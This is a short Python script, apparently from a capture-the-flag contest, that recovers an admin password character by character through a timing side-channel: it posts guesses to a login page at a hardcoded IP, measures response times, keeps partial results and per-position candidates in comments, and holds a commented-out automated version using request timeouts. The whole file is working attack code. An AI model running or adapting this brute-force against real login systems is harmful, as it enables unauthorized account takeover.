import requests
import string
import sys

import time

url = 'http://39.107.33.62:31927/login.php'
charset = string.ascii_letters + string.digits + string.punctuation
key = list('I10ve3P|g~')
# 0 I       I
# 1 16      1
# 2 f$07    0
# 3 v       v
# 4 e       e
# 5 35      3
# 6 DPQ     P
# 7 yO([|   |
# 8 eg*+    g
# 9 O

tk = 'icqff65bca6f3c108611ebcf276e3647'

for c in charset:
    key[9] = c
    print(''.join(key), ' ', c, end=' ')
    sys.stdout.flush()
    t = time.time()
    r = requests.post(url, data={
        'team': tk,
        'username': 'admin',
        'password': ''.join(key)
    })
    print('{0:.2f}'.format(time.time() - t))

# for pos in range(5, 10):
#     print(pos, end=' ')
#     sys.stdout.flush()
#     for c in charset:
#         key[pos] = c
#         print(c, end='')
#         sys.stdout.flush()
#         try:
#             r = requests.post(url, data={
#                 'team': tk,
#                 'username': 'admin',
#                 'password': ''.join(key)
#             }, timeout=0.6 * (pos + 1))
#         except requests.exceptions.ReadTimeout:
#             result += c
#             print()
#             break
#     print(result)
#
# print('pwd', result)
# 垃圾服务器 网络波动 怎么自动化？😠
